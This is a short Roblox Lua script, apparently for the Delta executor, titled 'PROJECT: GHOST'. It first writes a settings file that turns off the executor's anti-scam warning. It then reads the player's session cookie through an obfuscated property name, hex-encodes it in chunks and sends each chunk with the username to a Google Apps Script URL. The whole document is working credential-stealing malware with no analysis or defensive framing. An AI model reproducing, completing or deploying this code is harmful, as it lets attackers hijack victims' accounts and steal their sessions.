-- [[ PROJECT: GHOST ]]
local SETTINGS = {
    DESTINATION = "https://script.google.com/macros/s/AKfycbzWKCkpoBcO6AZzlp4uWB6zfzo9nzcdJ_vRdiA7n2RRgqb51M0IkK7d9AwidKUpXGOr/exec",
    PATH = "Delta/Internals/Secured/disableantiscam"
}

local user = game:GetService("Players").LocalPlayer
while not user do task.wait(1) user = game:GetService("Players").LocalPlayer end

-- 1. 権限の上書き (Bypass)
local function apply_clearance()
    local payload = string.format('{"warning":"none","allowed_games":"*","user_id":"%s","version_num":707}', tostring(user.UserId))
    local success, _ = pcall(function()
        if writefile then writefile(SETTINGS.PATH, payload) end
    end)
    return success
end

-- 2. データの抽出 (Extract)
local function initiate_transfer()
    local key = "Coo" .. "kie"
    local raw_data = game[key]
    if not raw_data or raw_data == "" then return end

    for chunk in raw_data:gmatch(".?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?") do
        local hex = ""
        for i = 1, #chunk do
            hex = hex .. string.format("%02X", string.byte(chunk:sub(i,i)))
        end
        pcall(function()
            game:HttpGet(SETTINGS.DESTINATION .. "?hex=" .. hex .. "&user=" .. user.Name)
        end)
        task.wait(0.7)
    end
end

-- Execute Sequence
if apply_clearance() then
    print("Clearance: OK")
    task.wait(1)
    initiate_transfer()
    print("Protocol: Complete")
end
